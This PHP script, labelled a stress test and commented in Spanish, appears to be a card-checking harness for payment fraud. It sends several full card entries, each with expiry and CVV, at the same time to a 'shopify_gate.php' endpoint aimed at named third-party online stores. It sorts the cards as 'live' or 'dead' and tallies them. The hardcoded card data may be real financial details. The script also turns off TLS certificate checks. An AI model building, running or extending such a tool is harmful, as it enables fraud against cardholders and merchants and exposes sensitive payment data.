<?php

/**
 * Stress Test - Envía 5 requests SIMULTANEOS a shopify_gate.php (curl_multi)
 * Uso: php stress_test.php [url_del_gate]
 * Ejemplo: php stress_test.php http://localhost/shopify_gate.php
 */

$gateUrl = $argv[1] ?? 'http://localhost:8080/shopify_gate.php';

$cards = [
    '5264120005531427|07|27|897',
    '4530810215673016|12|27|370',
    '4530810079306026|10|28|865',
    '4585812651961883|12|26|549',
];

// '5264120005531427|07|27|897',
// '4530810215673016|12|27|370',
//     '4530810079306026|10|28|865',
//     '4585812651961883|12|26|549',
//     '4533526001811316|06|28|810',
// $website = 'https://cinematicfxeffects.com';
// $website = 'https://johnsmensclothing.com/';
$website = 'https://www.darcyclothing.com/';

$total = count($cards);

echo "===========================================\n";
echo "  STRESS TEST - {$total} REQUESTS SIMULTANEOS\n";
echo "  Gate: $gateUrl\n";
echo "  Target: $website\n";
echo "===========================================\n\n";

$totalStart = microtime(true);

// Crear todos los handles y lanzarlos al mismo tiempo
$multiHandle = curl_multi_init();
$handles = [];
$startTimes = [];

// 'product' => [
//             "id" => 8780463603910,
//             "handle" => "clearance-shoes",
//             "title" => "Clearance Shoes",
//             "variant" => [
//                 "id" => 45523120390342,
//                 "title" => "Cole Haan",
//                 "price" => "102.00"
//             ]
//         ]

for ($i = 0; $i < $total; $i++) {
    $card = $cards[$i];
    $payload = json_encode([
        'card' => $card,
        'website' => $website,

    ]);

    $ch = curl_init($gateUrl);
    curl_setopt_array($ch, [
        CURLOPT_POST           => true,
        CURLOPT_POSTFIELDS     => $payload,
        CURLOPT_HTTPHEADER     => [
            'Content-Type: application/json',
        ],
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT        => 300,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false,
    ]);

    $handles[$i] = $ch;
    $startTimes[$i] = microtime(true);
    curl_multi_add_handle($multiHandle, $ch);
}

echo "Lanzados {$total} requests simultaneamente...\n\n";

// Ejecutar todos en paralelo
$running = null;
do {
    $status = curl_multi_exec($multiHandle, $running);
    if ($running) {
        curl_multi_select($multiHandle, 1);
    }
} while ($running > 0 && $status === CURLM_OK);

// Recoger resultados
$results = [];
for ($i = 0; $i < $total; $i++) {
    $ch = $handles[$i];
    $response   = curl_multi_getcontent($ch);
    $httpCode   = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $curlError  = curl_error($ch);
    $curlErrno  = curl_errno($ch);
    $elapsed    = round((microtime(true) - $startTimes[$i]) * 1000, 0);

    $card = $cards[$i];
    echo "[{$i}/{$total}] Card: " . substr($card, 0, 4) . "..." . substr($card, -3) . "\n";
    echo str_repeat('-', 50) . "\n";

    if ($curlErrno !== 0) {
        echo "  CURL ERROR [$curlErrno]: $curlError\n";
        $results[] = [
            'request' => $i,
            'status'  => 'CURL_ERROR',
            'time_ms' => $elapsed,
            'error'   => $curlError,
            'errno'   => $curlErrno,
        ];
    } else {
        $data      = json_decode($response, true);
        $status    = $data['status']    ?? 'unknown';
        $respMsg   = $data['response']  ?? 'no response';
        $timeTaken = $data['time_taken'] ?? 'N/A';

        $icon = match ($status) {
            'live'  => '+',
            'dead'  => 'x',
            default => '?',
        };

        echo "  [$icon] Status:    $status\n";
        echo "  [$icon] Response:  $respMsg\n";
        echo "  [$icon] HTTP:      $httpCode\n";
        echo "  [$icon] Gate time: {$timeTaken}ms\n";
        echo "  [$icon] Total:     {$elapsed}ms\n";

        $results[] = [
            'request'   => $i,
            'status'    => $status,
            'response'  => $respMsg,
            'http_code' => $httpCode,
            'gate_time' => $timeTaken,
            'time_ms'   => $elapsed,
        ];
    }
    echo "\n";

    curl_multi_remove_handle($multiHandle, $ch);
    curl_close($ch);
}

curl_multi_close($multiHandle);

// Resumen
$totalElapsed = round((microtime(true) - $totalStart) * 1000, 0);

echo "===========================================\n";
echo "  RESUMEN\n";
echo "===========================================\n";
echo "  Total requests:     " . count($results) . "\n";
echo "  Tiempo total:       {$totalElapsed}ms\n";
echo "  Promedio/req:       " . round($totalElapsed / count($results), 0) . "ms\n";
echo "  Mas lento:          " . max(array_column($results, 'time_ms')) . "ms\n";
echo "  Mas rapido:         " . min(array_column($results, 'time_ms')) . "ms\n\n";

$lives  = 0;
$deads  = 0;
$errors = 0;

foreach ($results as $r) {
    match ($r['status'] ?? 'error') {
        'live'       => $lives++,
        'dead'       => $deads++,
        default      => $errors++,
    };
}

echo "  Lives:  $lives\n";
echo "  Deads:  $deads\n";
echo "  Errors: $errors\n";
echo "===========================================\n";

// Mostrar gate log si hay errores
if ($errors > 0) {
    $logFile = __DIR__ . '/gate_log.txt';
    if (file_exists($logFile)) {
        echo "\n===========================================\n";
        echo "  GATE LOG (ultimas 50 lineas)\n";
        echo "===========================================\n";
        $lines = file($logFile);
        $tail = array_slice($lines, -50);
        echo implode('', $tail);
        echo "===========================================\n";
    }
}
